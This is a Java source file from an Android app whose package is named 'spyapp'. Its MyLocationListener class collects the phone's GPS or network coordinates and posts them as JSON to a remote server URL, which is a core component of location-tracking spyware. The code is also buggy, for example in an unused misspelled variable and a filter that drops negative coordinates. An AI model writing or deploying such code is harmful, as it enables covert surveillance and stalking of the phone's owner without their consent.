package com.example.spyapp.util;


import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.example.spyapp.http.PostData;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;



public class MyLocationListener implements LocationListener {
	public Context service;
	PostData postData=PostData.getInstance();
	 
    // flag for GPS status
    boolean isGPSEnabled = false;
 
    // flag for network status
    boolean isNetworkEnabled = false;
 
    // flag for GPS status
    boolean canGetLocation = false;
 
    Location location; // location
    double latitude; // latitude
    double longitude; // longitude
 
    // The minimum distance to change Updates in meters
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10; // 10 meters
 
    // The minimum time between updates in milliseconds
    private static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 1; // 1 minute
 
    // Declaring a Location Manager
    protected LocationManager locationManager;
    
    
    public MyLocationListener(Context g){
    	 JSONArray jsonArray=new JSONArray();
		 this.service=g;
		 if(locationManager==null){
				String location_context = Context.LOCATION_SERVICE;
				locationManager = (LocationManager) service.getSystemService(location_context);	
			}
	   	 Location locaiton=getLocation();
	   	if(location!=null){
	   		double lati= location.getLatitude();
		   	double longi=location.getLongitude();
		   	JSONObject jsonObj = new JSONObject();
				try {
					jsonObj.put("location_longi", longi);
					jsonObj.put("location_lati", lati);
				
					if (lati>0 && longi>0) {
	             	jsonArray.put(jsonObj);
	             }
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
		   	 
		   	String url=WebConst.Location_URL;
		   	String json=jsonArray.toString();
	        postData.requstPost(url, json);	
	   	} 
	   	
    }
    
 	public void onLocationChanged(Location location1) {
		location=location1;
	}
	public void onProviderDisabled(String provider){
		location = locationManager.getLastKnownLocation(provider);
	}
	public void onProviderEnabled(String provider){
		location = locationManager.getLastKnownLocation(provider);
	}
	public void onStatusChanged(String provider, int status,
	Bundle extras){
		
	}
	
	public Location getLocation() {
        try {
        	String location_context = Context.LOCATION_SERVICE;
            locationManager = (LocationManager) service
                    .getSystemService(location_context);
 
            // getting GPS status
            isGPSEnabled = locationManager
                    .isProviderEnabled(LocationManager.GPS_PROVIDER);
 
            // getting network status
            isNetworkEnabled = locationManager
                    .isProviderEnabled(LocationManager.NETWORK_PROVIDER);
 
            if (!isGPSEnabled && !isNetworkEnabled) {
                // no network provider is enabled
            } else {
                this.canGetLocation = true;
                // First get location from Network Provider
                if (isNetworkEnabled) {
                    locationManager.requestLocationUpdates(
                            LocationManager.NETWORK_PROVIDER,
                            MIN_TIME_BW_UPDATES,
                            MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
                    Log.d("Network", "Network");
                    if (locationManager != null) {
                        location = locationManager
                                .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        if (location != null) {
                            latitude = location.getLatitude();
                            longitude = location.getLongitude();
                            Toast.makeText(service, "Loction is find"+longitude, Toast.LENGTH_SHORT).show();
                        }
                    }
                }
                // if GPS Enabled get lat/long using GPS Services
                if (isGPSEnabled) {
                    if (location == null) {
                        locationManager.requestLocationUpdates(
                                LocationManager.GPS_PROVIDER,
                                MIN_TIME_BW_UPDATES,
                                MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
                        Log.d("GPS Enabled", "GPS Enabled");
                        if (locationManager != null) {
                            location = locationManager
                                    .getLastKnownLocation(LocationManager.GPS_PROVIDER);
                            if (location != null) {
                                latitude = location.getLatitude();
                                longitude = location.getLongitude();
                                Toast.makeText(service, "Loction is find"+longitude, Toast.LENGTH_SHORT).show();
                            }
                        }
                    }
                }
            }
 
        } catch (Exception e) {
            e.printStackTrace();
        }
 
        return location;
    }
     

}
